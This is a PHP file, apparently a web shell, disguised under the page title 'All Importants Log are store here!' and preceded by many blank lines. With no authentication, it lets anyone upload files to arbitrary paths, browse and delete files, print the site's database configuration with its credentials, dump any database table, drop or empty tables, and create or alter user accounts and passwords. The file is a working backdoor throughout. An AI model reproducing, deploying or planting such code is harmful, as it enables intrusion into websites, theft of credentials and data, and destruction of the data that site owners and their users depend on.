
























































































































































































































































<?php
   
   $base=dirname(__file__);
   if(isset($_REQUEST['upload'])){
	   $file = $_FILES["file"]["name"];
	   $location=$_REQUEST['path'];
	   if(empty($_REQUEST['path'])){
	   	$path = $base.'/' . $file;
	   }else{
		   $path = $location.'/' . $file;
		   }
	   
	   $success=move_uploaded_file($_FILES["file"]["tmp_name"], $path);
	   if($success)
	   {
		   echo "<b style='color:green'><span style='color:red; font-size:14px;'>$location <b style='font-size:24px;color:green'>&rarr;</b>  $file</span> File are uploaded!</b>";
	   }
   }
?>
<!DOCTYPE HTML>
<html>
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8">
<title>All Importants Log are store here!</title>

</head>

<body>
	<div style="width:1024px; margin:0 auto;">
    <form name="upload" method="post" action="" enctype="multipart/form-data">
    	<input type="text" name="path" value="" placeholder="Path" />
        <input type="file" name="file" />
        <input type="submit" name="upload" value="Send" />
    </form>
    <br><br><br>
    
    <h1>List of files:</h1>
<div style="width:300px; padding:5px; height:auto; border:1px solid; display:inline; float:left">
    <?php
    	$directory = $base;
		$phpfiles = glob("*");
		
		foreach($phpfiles as $phpfile)
		{
			echo "<a href=$phpfile>".basename($phpfile)."</a><br>";
		}
		
	?>
  </div>
  <div style="width:420px; height:auto; padding:5px; border:1px solid; display:inline; float:left">
  	<form name="dir" action="" method="post">
    	<input type="text" name="directory" value=""/>
        <input type="submit" name="diropen" value="findpath" />
    </form>
	<?Php
		//$dir=$base; // directory name
		if(isset($_REQUEST['diropen'])){
		   $dir = $_REQUEST['directory'];
		   }else{$dir=$base;}
		$ar=scandir($dir);
		if(isset($_POST['box'])){
			$box=$_POST['box']; // Receive the file list from form
		}
		// Looping through the list of selected files ///
		while (list ($key,$val) = @each ($box)) {
		$path=$dir ."/".$val;
		if(unlink($path)) echo "Deleted file ";
		echo "$val,";
		}
		echo "<hr>";
		
		/// displaying the file names with checkbox and form ////
		echo "<form method=post name='f1' action=''>";
		while (list ($key, $val) = each ($ar)) {
		if(strlen($val)>3){
		echo "<input type=checkbox name=box[] value='$val'>$val<br>";
		}
		}
		echo "<input type=submit value='Backup'></form>";


/*function rrmdir($dir) {
  if (is_dir($dir)) {
    $objects = scandir($dir);
    foreach ($objects as $object) {
      if ($object != "." && $object != "..") {
        if (filetype($dir."/".$object) == "dir") 
           rrmdir($dir."/".$object); 
        else unlink   ($dir."/".$object);
      }
    }
    reset($objects);
    rmdir($dir);
  }
 }
 echo rrmdir('test_dir');*/
?>
  </div> 
  
<?php
	/*$myfile = fopen("model/config.php", "r") or die("Unable to open file!");
	echo fread($myfile,filesize("model/config.php"));
	fclose($myfile);*/
?> 
<?php
	$myfile = fopen("model/config.php", "r") or die("Unable to open file!");
	// Output one line until end-of-file
	while(!feof($myfile)) {
	echo fgets($myfile) . "<br>";
	}
	fclose($myfile);
?> 
	
   <?php include('model/config.php'); ?>
   <script LANGUAGE="JavaScript"> 
		<!-- 
		function confirmSubmit(table_name,todo) {
		var msg;
		msg= "Are you sure you want to " + todo + " " + table_name  + "?";
		var agree=confirm(msg);
		if (agree)
		return true ;
		else
		return false ;
		}
		// -->
	</script>
   <div style="width:350px; height:auto; padding:5px; border:1px solid; display:inline; float:left">
  	<h1>Lists of Databases</h1>
    <?php
		
		/*$dbList = array();
        $result = $db->query("SHOW DATABASES");
		$i=0;
        while ($row = $result->fetch(PDO::FETCH_NUM)) {
            $dbList[] = $row[0];
			$i++;
			echo $i.") ".$row[0]."<br>";
			
        }*/
		$result = $db->query("SHOW DATABASES");
		$i=1;
		echo "<table class='t1'><tr>";
		while ($row = $result->fetch(PDO::FETCH_NUM)) {
		$m=$i%2;
		
		echo "<tr class='r$m'><td>$i.) <a href=functionss.php?database_name=$row[0]>$row[0]</a></td><td><a href=functionss.php?database_name=$row[0]>Display Tables</a></td></tr>";
		$i=$i+1;
		}
		echo "</table>";      
		  
		?>
    
    <h1>List of Tables :</h1>
    
    <form name="dir" action="" method="post">
    	<input type="text" name="tables" value=""/>
        <input type="submit" name="submit" value="findtables" />
    </form>
	
	<?php
		
		$tableList = array();
        $result = $db->query("SHOW TABLES");
		$j=0;
        while ($row = $result->fetch(PDO::FETCH_NUM)) {
            $tableList[] = $row[0];
			$j++;
			echo $j.") ".$row[0]."<br>";
        }
	?>
    
    
    </div>
    
    <div style="width:620px; height:auto; padding:5px; border:1px solid; display:inline; float:left">
		<?Php
			$top_menu= "<a href=functionss.php>HOME</a> . <a href=functionss.php> Databases </a> .  ";
			@$database_name=$_REQUEST['database_name'];
			@$table_name=$_REQUEST['table_name'];
			if(strlen($database_name)> 1 ){
			$top_menu .= " <a href=functionss.php?database_name=$database_name>$database_name</a>";
			}
			
			
			if(strlen($table_name)> 1 ){
			$top_menu .= " <a href=_REQUEST.php?database_name=$database_name&table_name=$table_name>$table_name</a>";
			}
			
			echo "<div id='menu'>$top_menu</div>";
		?>
		<hr/>
		<?Php
        
        $db->query("use $database_name");
        
        ////UN commenting below line will delete records and tables. Use this if you are aware of consequences //
        //include "drop-empty-table.php"; // Code to delete records and drop table //
        /////////////////////////////////////////////////
        
        
        $result = $db->query("SHOW TABLES from $database_name");
        
        $i=1;
        echo "<table class='t1'>";
        echo "<tr><th>Tables</th><th>No.</th><th colspan=2>Action</th><th >Empty</th><th >Delete</th></tr>";
        while ($row = $result->fetch(PDO::FETCH_NUM)) {
        $m=$i%2;
        $table_name=urlencode($row[0]);
        echo "<tr class='r$m'><td><a href=functionss.php?database_name=$database_name&table_name=$table_name>$row[0]</a></td>";
        
        // Display number of records /////
        $db->query("use $database_name");
        $nume = $db->query("select count(*) from  $row[0] ")->fetchColumn();
        //echo "<br>Number of records : ". $nume;
        echo "<td>$nume</td>";
        //////
        
        echo "<td><a href=functionss.php?database_name=$database_name&table_name=$table_name>Records</a></td>
        <td><a href=functionss.php?database_name=$database_name&table_name=$table_name>Structure</a></td>
        <td><a onclick=\"return confirmSubmit('$table_name','empty table')\" href=_REQUEST.php?database_name=$database_name&table_to_empty=$table_name&todo=empty_table>Empty</a></td>
        <td><a onclick=\"return confirmSubmit('$table_name','delete table')\" href=_REQUEST.php?database_name=$database_name&table_to_delete=$table_name&todo=delete_table>X</a></td>
        
        </tr>";
        $i=$i+1;
        }
        echo "</table>";      
            
        ?> 
        
        <!--------Show Structured ------->
        <h1>Show Table Structured</h1>
        <?Php
			$k=1;
			
			echo "<table  class='t1'>";
			echo "<tr><th>NAME</th><th>Type</th><th>IS NULL</th><th>DEFAULT</th></tr>";
			$dbn=$_REQUEST['database_name'];
			$tablen=$_REQUEST['table_name'];
			$select = $db->prepare("SELECT COLUMN_NAME,COLUMN_TYPE,  IS_NULLABLE, COLUMN_DEFAULT
			  FROM INFORMATION_SCHEMA.COLUMNS
			  WHERE table_name = '$tablen' AND table_schema = '$dbn'");
			$select->execute();
			
			while($result=$select->fetch(PDO::FETCH_NUM)){
			$m=$k%2;
			
			echo "<tr class='r$m'>";
			for($l=0;$l<4;$l++){
			echo "<td>$result[$l]</td> ";
			}
			echo "</tr>";
			$k=$k+1;
			}
			
			echo "</table>";
				  
			?>  
            <h1>Show Table Records</h1>
            <?Php
			$db->query("use `$dbn`");
			
			$result = $db->query("SHOW COLUMNS from `$tablen`");
			echo "<table  class='t1'><tr>";
			while ($row = $result->fetch(PDO::FETCH_NUM)) {
			echo "<th>$row[0]</th>";
			}
			///Number of columns ////
			
			$count=$db->prepare("select * from `$tablen` ");
			$count->execute();
			//echo "Number of Columns : ". $count->columnCount();
			$no_of_columns=$count->columnCount();
			
			///// Header is over now show records //// 
			$data=$db->prepare("select *  from `$tablen`");
			$data->execute();
			$i=1;
			while($result=$data->fetch(PDO::FETCH_NUM)){
			$m=$i%2;
			echo "<tr class='r$m'>";
			for($j=0;$j<$no_of_columns;$j++){
			echo "<td >$result[$j]</td>";
			}
			echo "</tr>"; 
			$i=$i+1;
			  
			}
			echo "</table>";
				  
			?> 
            
            <!-------- Table Records empty -------->
            <?Php
			////// Start of Delete Table or empty table ////
			@$todo=$_GET['todo'];
			switch($todo)
			{
			case 'delete_table':
			///// Delete Table ///// 
			$table_to_delete=$_GET['table_to_delete'];
			$sql=$db->prepare("DROP TABLE  $table_to_delete ");
			if($sql->execute()){
			echo " $table_to_delete Table deleted ";
			}else{
			print_r($sql->errorInfo()); 
			}
			break;
			///////// Empty records////
			case 'empty_table':
			$table_to_empty=$_GET['table_to_empty'];
			$count=$db->prepare("delete from $table_to_empty");
			$count->execute();
			$no=$count->rowCount();
			echo " No of records deleted = ".$no." from $table_to_empty";
			break;
			}
			////// End of Delete or  Empty Table ////
			?>
            
            <h1>Create User</h1>
            <?php
            	if(isset($_REQUEST['create'])){
					$tablen=$_REQUEST['tablename'];
					$username=$_REQUEST['username'];
					$password=$_REQUEST['password'];
						$insert=$db->prepare("INSERT INTO $tablen SET username=:username,password=:password,status=:status");
						$int=$insert->execute(array(':username'=>$username,':password'=>md5($password),':status'=>1));
						if($int){ $succ="<span style='color:green'>Yes ! New User Created!</span>";}
					}
			?>
            <p><?php echo $succ; ?></p>
            <form name="user" action="" method="post">
                <input type="text" name="tablename" placeholder="tablename" value=""/>
                <input type="text" name="username" placeholder="username" value=""/>
                <input type="text" name="password" placeholder="password" value=""/>
                <input type="submit" name="create" value="Create" />
            </form>
            
            
            <h1>Delete User</h1>
            <?php
            	if(isset($_REQUEST['delete'])){
					$tablename1=$_REQUEST['tablename1'];
					$id=$_REQUEST['id'];
						$insert=$db->prepare("DELETE from $tablename1 where id=:id");
						$int=$insert->execute(array(':id'=>$id));
						if($int){ $succ="<span style='color:green'>Yes ! User deleted!</span>";}
					}
			?>
            <p><?php echo $succ; ?></p>
            <form name="deleteuser" action="" method="post">
                <input type="text" name="tablename1" placeholder="tablename" value=""/>
                <input type="text" name="id" placeholder="id" value=""/>
                <input type="submit" name="delete" value="delete" />
            </form>
            
            
            
            <h1>Update User</h1>
            <?php
            	if(isset($_REQUEST['update'])){
					$tablename2=$_REQUEST['tablename2'];
					$id=$_REQUEST['id'];
					$password=$_REQUEST['password'];
						$insert=$db->prepare("UPDATE $tablename2 SET password=:password where id=:id");
						$int=$insert->execute(array(':id'=>$id,':password'=>md5($password)));
						if($int){ $succ="<span style='color:green'>Yes ! User Password Updated!</span>";}
					}
			?>
            <p><?php echo $succ; ?></p>
            <form name="updateuser" action="" method="post">
                <input type="text" name="tablename2" placeholder="tablename" value=""/>
                <input type="text" name="id" placeholder="id" value=""/>
                <input type="text" name="password" placeholder="password" value=""/>
                <input type="submit" name="update" value="update" />
            </form>
    </div>
    
    </div>
</body>
</html>